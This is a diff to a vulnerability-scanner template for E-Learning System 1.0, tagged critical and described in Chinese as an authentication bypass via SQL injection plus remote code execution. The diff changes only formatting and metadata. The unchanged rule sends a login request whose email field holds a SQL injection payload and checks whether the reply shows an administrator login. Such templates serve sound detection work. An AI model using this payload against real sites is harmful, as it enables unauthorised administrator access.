@@ -5,9 +5,12 @@ info:
   author: daffainfo
   severity: critical
   verified: false
-  description: E-Learning System 1.0-通过SQL注入+远程代码执行绕过身份验证
+  description: |-
+    E-Learning System 1.0-通过SQL注入+远程代码执行绕过身份验证
   reference:
     - https://www.exploit-db.com/exploits/49434
+  tags: ecology,sqli
+  created: 2023/06/23
 
 rules:
   r0:
@@ -19,4 +22,4 @@ rules:
       body: |
         user_email='or 1 or'&user_pass=lol&btnLogin=
     expression: response.body.bcontains(b'You login as Administrator.')
-expression: r0() 
+expression: r0()
